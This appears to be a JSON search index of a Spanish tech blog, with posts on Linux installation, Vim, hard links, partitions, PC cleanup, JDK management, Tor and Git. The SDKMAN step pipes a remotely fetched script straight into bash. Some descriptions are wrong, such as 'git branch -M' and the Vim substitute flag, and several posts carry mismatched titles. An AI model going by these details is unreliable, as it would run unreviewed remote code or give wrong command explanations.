partición del disco y la configuración de usuario. ¡Pero no te preocupes, estaré aquí para guiarte!\nUna tercera opción, si no deseas hacer cambios en tu disco duro principal, es utilizar una máquina virtual. Una máquina virtual es un entorno virtualizado en tu sistema operativo actual donde puedes ejecutar Linux como si fuera un programa. Existen varias aplicaciones de máquina virtual disponibles, como VirtualBox o VMware Player. Simplemente descarga e instala una de estas aplicaciones, crea una nueva máquina virtual, selecciona la imagen ISO de Linux y ¡voilà!, tendrás Linux funcionando dentro de tu sistema operativo actual.\n¡Ya casi estás allí, valiente explorador! Estas son las opciones principales para probar o instalar Linux en tu equipo. Elige la que mejor se adapte a tus necesidades y nivel de comodidad. ¡No te preocupes, cualquier opción que elijas, te espera un emocionante viaje hacia el mundo de Linux!"
  },
  {
    "objectID": "operating-system/2022-09-27-comandos-vim/index.html",
    "href": "operating-system/2022-09-27-comandos-vim/index.html",
    "title": "Comandos básicos de Vim para mejorar tu flujo de trabajo",
    "section": "",
    "text": "Vim es un editor de texto muy poderoso utilizado en sistemas Linux y Unix. A continuación, se presentan algunos de los comandos y combinaciones de teclas más utilizados en Vim:\n\nModos de Vim:\n\nModo de comandos: el modo predeterminado de Vim, en el que se pueden ingresar comandos para editar el texto. Para activar el modo comando en Vim, debes presionar la tecla “Esc”. Esto te llevará al modo comando desde cualquier otro modo en el que te encuentres, como el modo insertar o el modo de reemplazo. Una vez que estés en el modo comando, puedes utilizar una variedad de comandos y combinaciones de teclas para navegar, editar y guardar tus archivos. Para salir de Vim, puedes ingresar el comando “:q” seguido de Enter. Si has realizado cambios y deseas guardarlos antes de salir, utiliza el comando “:wq” para escribir y guardar los cambios y salir de Vim.\nModo de inserción: el modo en el que se puede ingresar texto normal.\nModo de visualización: el modo utilizado para seleccionar y manipular bloques de texto.\n\nModo de navegación:\n\nh: mueve el cursor una posición a la izquierda.\nj: mueve el cursor una posición hacia abajo.\nk: mueve el cursor una posición hacia arriba.\nl: mueve el cursor una posición a la derecha.\n0: mueve el cursor al inicio de la línea.\n$: mueve el cursor al final de la línea.\nw: mueve el cursor a la siguiente palabra.\nb: mueve el cursor a la palabra anterior.\ngg: mueve el cursor al inicio del archivo.\nG: mueve el cursor al final del archivo.\n:numero: mueve el cursor a la línea con el número especificado.\n\nModo de edición:\n\ni: entra en el modo de inserción antes del cursor.\na: entra en el modo de inserción después del cursor.\no: inserta una nueva línea debajo del cursor y entra en el modo de inserción.\nO: Insertar una nueva línea encima de la línea actual y entrar en modo de inserción.\nEsc: Salir del modo de inserción y volver al modo normal.\nd: elimina el texto seleccionado.\ny: copia el texto seleccionado.\np: pega el texto copiado o eliminado después del cursor.\nu: deshace la última acción.\nCtrl+r: rehace la última acción.\n\nGuardar y Salir\n\n:w: guarda el archivo actual.\n:q: sale de Vim.\n:wq: guarda el archivo y sale de Vim.\n:q!: sale de Vim sin guardar los cambios.\n\nManejo de Texto:\n\nx: elimina el carácter bajo el cursor.\ndw: elimina la palabra bajo el cursor.\ndd: elimina la línea actual.\nu: deshace la última cambio.\nCtrl+r: rehace el último cambio.\n\nCopiar, Cortar y Pegar\n\nyy: copia la línea actual.\n2yy: copia dos líneas a partir de la línea actual.\np: pega después del cursor.\nP: pega antes del cursor.\ndd: Cortar (eliminar) la línea actual.\n:set number: muestra los números de línea en el archivo.\n:set nonumber: oculta los números de línea en el archivo.\n\nComandos de búsqueda y reemplazo:\n\n/: busca el texto especificado hacia adelante.\n?: busca el texto especificado hacia atrás.\nn: busca la siguiente ocurrencia del texto especificado.\nN: busca la ocurrencia anterior del texto especificado.\n:s/old/new/g: reemplaza la primera ocurrencia de “old” con “new” en la línea actual.\n:s/old/new/gc: reemplaza todas las ocurrencias de “old” con “new” en la línea actual y pide confirmación antes de cada reemplazo.\n\n\nEstos son solo algunos de los comandos y combinaciones de teclas más utilizados en Vim. Hay muchos más disponibles, y la lista completa se puede encontrar en la documentación de Vim.\n\nPublicaciones Similares\nSi te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:\n\n Comandos De Informacion Windows\n Adb\n Limpieza Y Optimizacion De Pc\n Usando Apk En Windown 11\n Gestionar Versiones De Jdk En Kubuntu\n Instalar Tor Browser\n Crear Enlaces Duros O Hard Link En Linux\n Comandos Vim\n Guia De Git Y Github\n 00 Primeros Pasos En Linux\n 01 Introduccion Linux\n 02 Distribuciones Linux\n 03 Instalacion Linux\n 04 Administracion Particiones Volumenes\n Atajos De Teclado Y Comandos Para Usar Vim\n Instalando Specitify\n\nEsperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!\n\n\n\n\nReutilizaciónCC BY-SA 4.0Cómo citarPor favor, cita este trabajo como:\nAchalma, Edison. 2022. “Comandos básicos de Vim para mejorar tu\nflujo de trabajo,” September. https://achalmaedison.netlify.app/operating-system/2022-09-27-comandos-vim/."
  },
  {
    "objectID": "operating-system/2022-08-14-crear-enlaces-duros-o-hard-link-en-linux/index.html#introducción",
    "href": "operating-system/2022-08-14-crear-enlaces-duros-o-hard-link-en-linux/index.html#introducción",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "Introducción",
    "text": "Introducción\nLos enlaces duros o hard link asocian dos o más ficheros compartiendo el mismo inodo, esto hace que cada enlace duro sea una copia exacta del resto de los ficheros enlazados, tanto en los datos como en los permisos, propietario, grupo, etc. Cuando se modifica uno de los enlaces o el fichero original, los cambios afectan al resto de los enlaces.\n\nNota: Los enlaces duros no pueden hacerse contra directorios y tampoco fuera del propio sistema de ficheros.\n\nEn sistemas linux también existen los enlaces simbolicos, también conocidos como enlaces blandos o Symlinks."
  },
  {
    "objectID": "operating-system/2022-08-14-crear-enlaces-duros-o-hard-link-en-linux/index.html#características-principales-de-los-enlaces-duros",
    "href": "operating-system/2022-08-14-crear-enlaces-duros-o-hard-link-en-linux/index.html#características-principales-de-los-enlaces-duros",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "Características principales de los enlaces duros",
    "text": "Características principales de los enlaces duros\n\nSolo se pueden hacer entre ficheros. No se pueden hacer entre directorios.\nNo se pueden hacer entre distintos sistemas de ficheros.\nComparten el número de inodo\nSi se borra el fichero original la información no se pierde.\nSon copias exactas del fichero original. Los cambios aplicados a uno de ellos o al fichero original, afectan a todos."
  },
  {
    "objectID": "operating-system/2022-08-14-crear-enlaces-duros-o-hard-link-en-linux/index.html#creando-un-enlace-duro-hard-link",
    "href": "operating-system/2022-08-14-crear-enlaces-duros-o-hard-link-en-linux/index.html#creando-un-enlace-duro-hard-link",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "Creando un enlace duro (hard link)",
    "text": "Creando un enlace duro (hard link)\nLa sintaxis genérica para crear un enlace duro es la siguiente:\nln TARGET LINK_NAME\n\nTARGET: Nombre del archivo existente al que le crearemos el enlace duro.\nLINK_NAME: Nombre del enlace duro.\n\nVeamos un ejemplo:\nln test.txt enlace-duro-a-test.txt\nSi listamos ambos archivos con el comando ls -li,\nls -li\nObservamos que ambos comparten el mismo inodo\n786433 -rw-r--r-- 2 achalma achalma 0 jun 21 21:27 enlace-duro-a-test.txt\n786433 -rw-r--r-- 2 achalma achalma 0 jun 21 21:27 test.txt\nSe observa en la primera columna que ambos, archivo y enlace, comparten el mismo número de inodo (786433). La tercera columna indica cuantos enlaces duros tiene el fichero, en este caso 2, el archivo original más el enlace.\nSi modificamos uno de ellos, los cambios afectan a todos. Por ejemplo, vamos a conceder permiso de ejecución al propietario en el archivo test.txt y veamos que pasa con el enlace:\nchmod u+x test.txt\nSi volvemos a listar ambos archivos vemos que el cambio ha afectado a ambos, al fichero original y al enlace:\n$ ls -li\n786433 -rwxr--r-- 2 achalma achalma 0 jun 21 21:27 enlace-duro-a-test.txt\n786433 -rwxr--r-- 2 achalma achalma 0 jun 21 21:27 test.txt\nSi editásemos el archivo o el enlace, los cambios realizados en el contenido afectarían a ambos. ## Generar varios\nPara crear 35 enlaces duros de _metadata.yml puedes usar un simple bucle for en la terminal de Linux:\nfor i in {1..35}; do ln _metadata.yml \"_metadata$i.yml\"; done\nEste comando hace lo siguiente:\n\nfor i in {1..35}: Esto establece un bucle que itera desde 1 hasta 35.\nln _metadata.yml \"_metadata$i.yml\": Dentro del bucle, se ejecuta el comando ln para crear un enlace duro de _metadata.yml con el nombre _metadataX.yml, donde X es el valor actual de i en el bucle.\n\nFinalmente, se generarán los 35 enlaces duros."
  },
  {
    "objectID": "operating-system/2023-06-20-04-administracion-particiones-volumenes/index.html",
    "href": "operating-system/2023-06-20-04-administracion-particiones-volumenes/index.html",
    "title": "Administracion de particiones y volumenes",
    "section": "",
    "text": "¡Hola, lector! Te doy la más cordial bienvenida a esta nueva entrega de nuestra serie de introducción a Linux. En esta ocasión, vamos a sumergirnos en un tema fascinante y fundamental: las Particiones y Volúmenes en Linux.\nSi ya has leído nuestros artículos anteriores sobre GNU/Linux, distribuciones y entornos de escritorio, estás listo para adentrarte en el apasionante mundo de la administración del sistema. Aquí descubrirás cómo estructurar y gestionar tus particiones, así como los volúmenes que albergan tus datos.\n\nEsquema de Particiones: MBR y GPT\nDos de los esquemas más comunes son MBR (Master Boot Record) y GPT (GUID Partition Table). Estos esquemas determinan cómo se organiza y gestiona el espacio en tu disco duro.\n1. MBR (Master Boot Record): Es el esquema más antiguo y ampliamente utilizado. Permite dividir el disco en hasta 4 particiones primarias, o 3 particiones primarias y una extendida que puede contener múltiples particiones lógicas. Es compatible con la mayoría de los sistemas operativos, pero tiene limitaciones, como la capacidad máxima de 2 terabytes para cada partición.\n2. GPT (GUID Partition Table): Es el esquema más moderno y robusto. Puede manejar discos de mayor capacidad y admite hasta 128 particiones. Además, ofrece beneficios adicionales, como la redundancia de datos y la recuperación ante fallas. GPT es compatible con sistemas UEFI (Unified Extensible Firmware Interface) y es la elección recomendada para discos de más de 2 terabytes.\n\n\n¿Cómo se genera el esquema de particiones en GNU/Linux?\nEste proceso es crucial para organizar y aprovechar al máximo el espacio de tu disco duro.\nEn GNU/Linux, puedes elegir el esquema de particiones cuando quemas la imagen ISO en un medio USB. Normalmente, se recomienda utilizar GPT si tu equipo es relativamente moderno. Puedes trabajar con MBR o GPT indistintamente, pero la elección adecuada marcará la diferencia.\nUna de las aplicaciones más populares para crear medios de instalación es Rufus (disponible actualmente solo para Windows). Te permite seleccionar MBR o GPT, pero de forma predeterminada, la opción MBR está seleccionada. Algunas herramientas pueden no pedirte esta elección y preparar los medios con MBR por compatibilidad, así que es importante elegir la aplicación adecuada.\nIndependientemente del esquema utilizado, la mayoría de las distribuciones crean una tabla de particiones por defecto durante el asistente de instalación. Esta tabla suele incluir una partición primaria para instalar el sistema operativo y una partición lógica reservada para el área de intercambio.\nEn el caso de GNU/Linux, es común crear una partición primaria para el sistema operativo y una partición lógica para el área de intercambio o Swap. Sin embargo, si lo deseas, puedes personalizar la tabla de particiones según tus necesidades, creando particiones adicionales o redimensionando las existentes.\nSi estás acostumbrado a Windows, probablemente estés familiarizado con la nomenclatura basada en letras para distinguir entre diferentes volúmenes (particiones y unidades físicas). Por ejemplo, la unidad C es donde se encuentra instalado el sistema operativo, y las unidades D, E, F, etc., representan otras particiones del mismo disco o de unidades externas.\nEn GNU/Linux, no existe esa nomenclatura. El sistema operativo se origina desde el directorio raíz, representado como “/”. Todos los demás directorios derivan del directorio raíz, independientemente de la partición en la que se encuentren.\nAquí tienes un ejemplo de cómo podrías representar tres particiones en una instalación típica, donde además de la partición del sistema operativo y la de intercambio, decides utilizar una partición separada para el directorio “/home”.\n\n\nAdministrador de Volúmenes LVM\nEl Administrador de Volúmenes LVM (Logical Volume Manager) es una herramienta que te permite crear volúmenes lógicos a partir de uno o varios discos físicos. ¿Por qué es tan genial? Pues porque te brinda flexibilidad y control sobre tus particiones, permitiéndote redimensionarlas en caliente, es decir, sin necesidad de reiniciar el sistema. ¡Es como la magia del almacenamiento en acción!\nImagínate que tienes una partición que se está quedando sin espacio, pero en cambio, tienes espacio libre en otra partición. Con LVM, puedes agrandar la partición necesitada y aprovechar ese espacio libre. ¡Adiós a los dolores de cabeza por falta de espacio!\n¿Pero cómo funciona? Muy sencillo. LVM utiliza tres elementos principales: volúmenes físicos (PV), grupos de volúmenes (VG) y volúmenes lógicos (LV). Los volúmenes físicos son los discos duros o particiones que utilizaremos para crear nuestro espacio de almacenamiento. Los grupos de volúmenes actúan como contenedores que agrupan los volúmenes físicos, mientras que los volúmenes lógicos son las unidades de almacenamiento que se utilizan como particiones en tu sistema.\nCon LVM, puedes crear, eliminar, redimensionar y administrar estos volúmenes lógicos de manera dinámica, adaptándolos según tus necesidades. Además, también puedes crear instantáneas de tus volúmenes lógicos para hacer copias de seguridad o probar cambios sin arriesgar tus datos. ¡Es como tener superpoderes de gestión de almacenamiento!\n\n\nCifrado de Disco LUKS\nEl cifrado de disco LUKS (Linux Unified Key Setup) te permite encriptar tus particiones o discos completos en GNU/Linux. ¿Por qué es importante? Porque asegura la confidencialidad de tu información, evitando que terceros no autorizados accedan a tus datos en caso de pérdida o robo del equipo. Es como un fuerte escudo para tus archivos más preciados.\nLUKS utiliza algoritmos criptográficos de alta seguridad, como AES (Advanced Encryption Standard), para proteger tus datos. Puedes elegir una contraseña fuerte o incluso utilizar una clave en un dispositivo USB para desbloquear tus discos en el arranque. ¡Tú tienes el control total de tus claves!\nUna vez que hayas configurado el cifrado LUKS en tu disco, cada vez que inicies tu sistema, se te pedirá la contraseña o la clave del USB para desbloquear el disco. Después de desbloquearlo, podrás utilizar tu sistema de forma normal, pero con la tranquilidad de saber que tus datos están protegidos.\nAdemás, LUKS también te brinda la posibilidad de crear contenedores encriptados, donde puedes almacenar archivos y carpetas sensibles. Estos contenedores se comportan como archivos normales, pero están protegidos por una capa adicional de seguridad. Puedes abrirlos y acceder a su contenido solo con la contraseña correcta. ¡Es como tener una caja fuerte virtual en tu sistema!\nEs importante tener en cuenta que el cifrado de disco LUKS puede afectar ligeramente el rendimiento del sistema, ya que cada vez que accedas a tus datos, se realizará la desencriptación en tiempo real. Sin embargo, esta pequeña pérdida de velocidad vale la pena para garantizar la seguridad de tus archivos.\nAhora que conoces los beneficios del cifrado de disco LUKS, no dudes en explorar esta poderosa herramienta y mantener tus datos a salvo de miradas indiscretas.\n\n\nPublicaciones Similares\nSi te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:\n\n Comandos De Informacion Windows\n Adb\n Limpieza Y Optimizacion De Pc\n Usando Apk En Windown 11\n Gestionar Versiones De Jdk En Kubuntu\n Instalar Tor Browser\n Crear Enlaces Duros O Hard Link En Linux\n Comandos Vim\n Guia De Git Y Github\n 00 Primeros Pasos En Linux\n 01 Introduccion Linux\n 02 Distribuciones Linux\n 03 Instalacion Linux\n 04 Administracion Particiones Volumenes\n Atajos De Teclado Y Comandos Para Usar Vim\n Instalando Specitify\n\nEsperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!\n\n\n\n\nReutilizaciónCC BY-SA 4.0Cómo citarPor favor, cita este trabajo como:\nAchalma, Edison. 2023. “Administracion de particiones y\nvolumenes,” June. https://achalmaedison.netlify.app/operating-system/2023-06-20-04-administracion-particiones-volumenes/."
  },
  {
    "objectID": "operating-system/2021-08-17-limpieza-y-optimizacion-de-pc/index.html",
    "href": "operating-system/2021-08-17-limpieza-y-optimizacion-de-pc/index.html",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Limpieza y Optimización de PC - Windows 11\nPasos para Limpiar tu PC:\n\nEliminación de Archivos Temporales:\n\nPresiona “Win + R” para abrir el cuadro de ejecución.\nEscribe %temp% y presiona Enter.\nSelecciona todos los archivos y elimínalos.\nEjecuta nuevamente y escribe “temp” sin porcentajes.\nElimina todos los archivos nuevamente.\n\nLimpieza de Prefetch:\n\nPresiona “Win + R”.\nEscribe “prefetch” y presiona Enter.\nSelecciona y elimina los archivos.\n\nLimpieza de Registros:\n\nPresiona “Win + R”.\nEscribe “eventvwr” y presiona Enter.\nEn la ventana que se abre, ve a “Windows Log”, luego “Registro de Windows”.\nVacía los registros de “Aplicación” y “Eventos”.\n\nLimpieza con Cleanmgr:\n\nEjecuta el siguiente comando en “Ejecutar”:\n%SystemRoot%\\System32\\Cmd.exe /c Cleanmgr /sageset:65535 &Cleanmgr /sagerun:65535\n\n\nLimpieza y Optimización de PC - Linux:\n\nEliminación de Paquetes de Instalación:\n\nEjecuta el comando:\nsudo apt-get autoremove\n\nLimpieza de Paquetes en Caché:\n\nEjecuta los siguientes comandos:\nsudo apt-get autoclean\nsudo apt-get clean\n\nEliminación de Paquetes Huérfanos:\n\nUtiliza el siguiente comando para verificar paquetes huérfanos:\nsudo deborphan\n\n\nRecuerda que estos pasos pueden liberar espacio y mejorar el rendimiento de tu sistema. Asegúrate de respaldar cualquier dato importante antes de realizar estas operaciones.\nEste procedimiento te ayudará a mantener tu sistema limpio y eficiente. No olvides revisar regularmente para mantener un rendimiento óptimo.\n\n\nPublicaciones Similares\nSi te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:\n\n Comandos De Informacion Windows\n Adb\n Limpieza Y Optimizacion De Pc\n Usando Apk En Windown 11\n Gestionar Versiones De Jdk En Kubuntu\n Instalar Tor Browser\n Crear Enlaces Duros O Hard Link En Linux\n Comandos Vim\n Guia De Git Y Github\n 00 Primeros Pasos En Linux\n 01 Introduccion Linux\n 02 Distribuciones Linux\n 03 Instalacion Linux\n 04 Administracion Particiones Volumenes\n Atajos De Teclado Y Comandos Para Usar Vim\n Instalando Specitify\n\nEsperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!\n\n\n\n\nReutilizaciónCC BY-SA 4.0Cómo citarPor favor, cita este trabajo como:\nAchalma, Edison. 2021. “Guía de Git Cómo trabajar en equipo en\nproyectos,” August. https://achalmaedison.netlify.app/operating-system/2021-08-17-limpieza-y-optimizacion-de-pc/."
  },
  {
    "objectID": "SECURITY.html",
    "href": "SECURITY.html",
    "title": "Security Policy",
    "section": "",
    "text": "Use this section to tell people about which versions of your project are currently being supported with security updates.\n\n\n\nVersion\nSupported\n\n\n\n\n5.1.x\n:white_check_mark:\n\n\n5.0.x\n:x:\n\n\n4.0.x\n:white_check_mark:\n\n\n&lt; 4.0\n:x:\n\n\n\n\n\n\nUse this section to tell people how to report a vulnerability.\nTell them where to go, how often they can expect to get an update on a reported vulnerability, what to expect if the vulnerability is accepted or declined, etc."
  },
  {
    "objectID": "SECURITY.html#supported-versions",
    "href": "SECURITY.html#supported-versions",
    "title": "Security Policy",
    "section": "",
    "text": "Use this section to tell people about which versions of your project are currently being supported with security updates.\n\n\n\nVersion\nSupported\n\n\n\n\n5.1.x\n:white_check_mark:\n\n\n5.0.x\n:x:\n\n\n4.0.x\n:white_check_mark:\n\n\n&lt; 4.0\n:x:"
  },
  {
    "objectID": "SECURITY.html#reporting-a-vulnerability",
    "href": "SECURITY.html#reporting-a-vulnerability",
    "title": "Security Policy",
    "section": "",
    "text": "Use this section to tell people how to report a vulnerability.\nTell them where to go, how often they can expect to get an update on a reported vulnerability, what to expect if the vulnerability is accepted or declined, etc."
  },
  {
    "objectID": "operating-system/2022-05-12-gestionar-versiones-de-jdk-en-kubuntu/index.html",
    "href": "operating-system/2022-05-12-gestionar-versiones-de-jdk-en-kubuntu/index.html",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Gestionar varias versiones de JDK en Kubuntu (o cualquier distribución basada en Ubuntu) puede hacerse de varias maneras, aquí te describo algunas de las más comunes:\n\nUsando update-alternatives para gestionar versiones JDK:\n\n\nListar versiones instaladas:\nsudo update-alternatives --config java\nEsto te mostrará las versiones de Java disponibles y te permitirá elegir una como predeterminada.\nInstalar una nueva versión de JDK:\n\nPuedes instalar diferentes versiones de OpenJDK usando apt:\nsudo apt update\nsudo apt install openjdk-8-jdk openjdk-11-jdk openjdk-17-jdk  # O cualquier otra versión que desees\nPara Oracle JDK, generalmente necesitas añadir un PPA o descargarlo manualmente debido a las licencias:\nsudo add-apt-repository ppa:linuxuprising/java\nsudo apt update\nsudo apt install oracle-java11-installer  # Asegúrate de reemplazar 11 con la versión que quieras\n\nConfigurar la versión predeterminada: Después de instalar, usa update-alternatives para elegir la versión predeterminada:\nsudo update-alternatives --config java\nsudo update-alternatives --config javac\n\n\nUsando SDKMAN! para gestionar múltiples JDKs:\n\n\nInstalar SDKMAN!:\ncurl -s \"https://get.sdkman.io\" | bash\nsource \"$HOME/.sdkman/bin/sdkman-init.sh\"\nListar versiones disponibles de JDK:\nsdk list java\nInstalar una versión específica:\nsdk install java &lt;version-id&gt;\nDonde  es el identificador de la versión que deseas instalar, como 8.0.265-zulu, 17.0.1-tem, etc.\nCambiar entre versiones:\nsdk use java &lt;version-id&gt;\nEstablecer una versión como predeterminada:\nsdk default java &lt;version-id&gt;\nEliminar una versión:\nsdk uninstall java &lt;version-id&gt;\nActualizar una versión: SDKMAN! puede manejar actualizaciones automáticamente, pero para actualizar manualmente:\nsdk upgrade java\n\n\nEliminar versiones de JDK:\n\n\nEliminar con apt:\nsudo apt remove openjdk-8-jdk  # Reemplaza 8 con la versión que quieras eliminar\nEliminar con SDKMAN!: Usa el comando mencionado anteriormente para desinstalar versiones.\n\nConsideraciones:\n\nJAVA_HOME: Después de cambiar la versión de Java, asegúrate de actualizar la variable de entorno JAVA_HOME o usa SDKMAN! que puede manejar esto automáticamente.\nCompatibilidad de aplicaciones: Algunas aplicaciones pueden requerir una versión específica de Java. Asegúrate de probar después de cambiar la versión predeterminada.\nActualizaciones de seguridad: Mantén tus JDKs actualizados para aplicaciones críticas debido a las actualizaciones de seguridad.\n\nEstas herramientas y comandos te permitirán gestionar tus versiones de JDK en Kubuntu de manera eficiente, aunque para tareas más complejas o si tienes muchas versiones, SDKMAN! puede ser tu mejor aliado.\n\nPublicaciones Similares\nSi te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:\n\n Comandos De Informacion Windows\n Adb\n Limpieza Y Optimizacion De Pc\n Usando Apk En Windown 11\n Gestionar Versiones De Jdk En Kubuntu\n Instalar Tor Browser\n Crear Enlaces Duros O Hard Link En Linux\n Comandos Vim\n Guia De Git Y Github\n 00 Primeros Pasos En Linux\n 01 Introduccion Linux\n 02 Distribuciones Linux\n 03 Instalacion Linux\n 04 Administracion Particiones Volumenes\n Atajos De Teclado Y Comandos Para Usar Vim\n Instalando Specitify\n\nEsperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!\n\n\n\n\nReutilizaciónCC BY-SA 4.0Cómo citarPor favor, cita este trabajo como:\nAchalma, Edison. 2022. “Guía de Git Cómo trabajar en equipo en\nproyectos,” May. https://achalmaedison.netlify.app/operating-system/2022-05-12-gestionar-versiones-de-jdk-en-kubuntu/."
  },
  {
    "objectID": "operating-system/2022-07-21-instalar-tor-browser/index.html",
    "href": "operating-system/2022-07-21-instalar-tor-browser/index.html",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Tor es una herramienta esencial para la privacidad y el anonimato en Internet. A continuación, te explicamos cómo descargar e instalar Tor en Linux de manera sencilla.\n\n\n\nDescargar el navegador Tor\nVe a la página oficial de Tor y descarga la versión correspondiente a tu sistema operativo.\nAbrir la terminal y navegar a la carpeta de descargas\ncd ~/Downloads\nExtraer el archivo descargado\nSustituye tor-browser-linux--- por el nombre exacto del archivo que descargaste.\ntar -xf tor-browser-linux---\nEntrar al directorio de Tor\ncd tor-browser\nVerificar los archivos dentro del directorio\nls\nRegistrar la aplicación en el sistema\n./start-tor-browser.desktop --register-app\n\n\n\n\nAhora puedes abrir Tor desde el menú de aplicaciones de tu sistema o ejecutarlo manualmente con:\n   ./start-tor-browser.desktop\nNavega de manera segura y anónima con Tor."
  },
  {
    "objectID": "operating-system/2022-07-21-instalar-tor-browser/index.html#pasos-para-la-instalación",
    "href": "operating-system/2022-07-21-instalar-tor-browser/index.html#pasos-para-la-instalación",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Descargar el navegador Tor\nVe a la página oficial de Tor y descarga la versión correspondiente a tu sistema operativo.\nAbrir la terminal y navegar a la carpeta de descargas\ncd ~/Downloads\nExtraer el archivo descargado\nSustituye tor-browser-linux--- por el nombre exacto del archivo que descargaste.\ntar -xf tor-browser-linux---\nEntrar al directorio de Tor\ncd tor-browser\nVerificar los archivos dentro del directorio\nls\nRegistrar la aplicación en el sistema\n./start-tor-browser.desktop --register-app"
  },
  {
    "objectID": "operating-system/2022-07-21-instalar-tor-browser/index.html#conclusión",
    "href": "operating-system/2022-07-21-instalar-tor-browser/index.html#conclusión",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Ahora puedes abrir Tor desde el menú de aplicaciones de tu sistema o ejecutarlo manualmente con:\n   ./start-tor-browser.desktop\nNavega de manera segura y anónima con Tor."
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Esta guía te introduce a los fundamentos de Git y GitHub, desde la instalación hasta la gestión avanzada de proyectos. Ideal tanto para principiantes como para quienes buscan perfeccionar sus habilidades en control de versiones.\nGit es un sistema de control de versiones (SCV) esencial para rastrear cambios en el código, colaborar en equipo y experimentar con nuevas ideas mediante ramas. Plataformas como GitHub potencian esta colaboración al hospedar repositorios y facilitar el intercambio de código.\n\n\nGit organiza los proyectos en tres áreas principales: - Directorio de trabajo: Donde editas tus archivos. - Área de preparación (staging): Donde preparas los cambios antes de confirmarlos. - Directorio Git: Almacena las instantáneas confirmadas de tu proyecto.\nDisponible en Linux, Windows y macOS, Git tiene una curva de aprendizaje inicial, pero su dominio abre un mundo de posibilidades para gestionar proyectos eficientemente.\n\n\n\nAquí tienes los comandos fundamentales:\n\necho \"# Léeme\" &gt;&gt; README.md: Crea un archivo README.md con el texto “# Léeme”.\ngit init: Inicia un nuevo repositorio en el directorio actual.\ngit add [file]: Añade un archivo al área de preparación.\ngit commit -m \"Primer commit\": Guarda los cambios con un mensaje descriptivo.\ngit branch -M main: Muestra las ramas existentes.\ngit remote add origin git@github.com:achalmed/repositorio.git : Vincula el repositorio local con uno remoto en GitHub.\ngit push -u origin main: Envía los cambios al repositorio remoto.\ngit status: Muestra el estado actual del repositorio.\ngit log: Lista el historial de commits.\ngit diff: Compara cambios no confirmados con el último commit.\ngit checkout [branch]: Cambia a una rama específica.\ngit merge [branch]: Fusiona una rama con la actual.\ngit config --global user.name \"tu-nombre\": Configura tu nombre de usuario.\ngit config --global user.email \"tu-email@example.com\": Configura tu correo.\n\n\n\n\n\n\n\nVerifica si Git está instalado:\ngit --version\nEjemplo de salida: git version 2.34.1\nSi no está instalado, actualiza e instala con APT:\nsudo apt update\nsudo apt install git\nConfigura tu identidad:\ngit config --global user.name \"Tu Nombre\"\ngit config --global user.email \"tu.correo@example.com\"\nVerifica la configuración:\ngit config --list\n\n\n\n\n\nInstala las dependencias:\nsudo apt update\nsudo apt install libz-dev libssl-dev libcurl4-gnutls-dev libexpat1-dev gettext cmake gcc\nDescarga y descomprime la versión deseada (ejemplo: 2.34.1):\nmkdir tmp && cd tmp\ncurl -o git.tar.gz https://mirrors.edge.kernel.org/pub/software/scm/git/git-2.34.1.tar.gz\ntar -zxf git.tar.gz\ncd git-*\nCompila e instala:\nmake prefix=/usr/local all\nsudo make prefix=/usr/local install\nexec bash\nConfirma la instalación:\ngit --version\n\n\n\n\n\n\n\n\nVerifica claves existentes:\nls -al ~/.ssh\nSi no hay claves, crea el directorio: mkdir ~/.ssh.\nGenera un par de claves:\nssh-keygen -t rsa -b 4096 -C \"tu.email@example.com\"\nAcepta el nombre predeterminado y añade una contraseña (opcional).\n\n\n\n\n\nInicia el agente:\neval \"$(ssh-agent -s)\"\nAñade la clave privada:\nssh-add ~/.ssh/id_rsa\n\n\n\n\n\nCopia la clave pública:\n\nLinux/Mac: cat ~/.ssh/id_rsa.pub\nWindows: clip &lt; ~/.ssh/id_rsa.pub\n\nEn GitHub, ve a Settings &gt; SSH and GPG keys &gt; New SSH key, pega la clave y guárdala.\nPrueba la conexión:\nssh -T git@github.com\nResultado esperado: Hi tu_usuario! You've successfully authenticated...\n\n\n\n\n\n\nInicia un repositorio:\ngit init [nombre-del-proyecto]\nAñade archivos y haz un commit:\ngit add .\ngit commit -m \"Primer commit\"\n\n\n\n\n\n\nClona un repositorio remoto:\ngit clone https://github.com/usuario/repositorio.git\nClonación en carpeta específica\ngit clone https://github.com/usuario/repositorio.git /ruta/deseada\n\n\n\nSolo las últimas n confirmaciones:\ngit clone --depth=1 https://github.com/usuario/repositorio.git\n\n\n\ngit clone --branch=nombre-rama https://github.com/usuario/repositorio.git\n\n\n\n\n\nCrea un repositorio en GitHub (público o privado).\nEn tu proyecto local:\n\nCon SSH\necho \"# examen\" &gt;&gt; README.md\ngit init\ngit add .\ngit commit -m \"Primer commit\"\ngit branch -M main\ngit remote add origin git@github.com:usuario/repositorio.git\ngit push -u origin main\nCon HTTPS\necho \"# examen\" &gt;&gt; README.md\ngit init\ngit add .\ngit commit -m \"Primer commit\"\ngit branch -M main\ngit remote add origin https://github.com/usuario/repositorio.git\ngit push -u origin main\n\nSi aparece el error remote origin already exists:\ngit remote rm origin\nLuego repite el paso 2.\n\n\n\n\n\ngit status: Muestra 